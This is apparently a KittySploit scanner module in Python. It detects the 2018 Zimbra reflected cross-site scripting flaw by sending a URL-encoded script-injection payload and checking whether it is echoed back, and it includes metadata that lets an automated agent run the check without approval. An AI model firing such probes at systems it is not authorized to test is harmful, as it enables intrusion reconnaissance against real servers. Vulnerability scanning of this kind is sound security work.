#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Synacor Zimbra Collaboration Suite Collaboration before 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Synacor Zimbra Collaboration Suite Collaboration <8.8.11 - Cross-Site Scripting Detection',
        'description': 'Synacor Zimbra Collaboration Suite Collaboration before 8.8.11 is vulnerable to cross-site scripting via the AJAX and html web clients.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'xss', 'zimbra', 'synacor', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories',
            'https://bugzilla.zimbra.com/show_bug.cgi?id=109018',
            'https://bugzilla.zimbra.com/show_bug.cgi?id=109017',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-14013',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-14013',
    }

    def run(self):
        r = self.http_request(method="GET", path='/zimbra/h/search?si=1&so=0&sfi=4&st=message&csi=1&action=&cso=0&id=%22%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Synacor Zimbra Collaboration Suite Collaboration <8.8.11 - Cross-Site Scripting detected",
                path='/zimbra/h/search?si=1&so=0&sfi=4&st=message&csi=1&action=&cso=0&id=%22%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

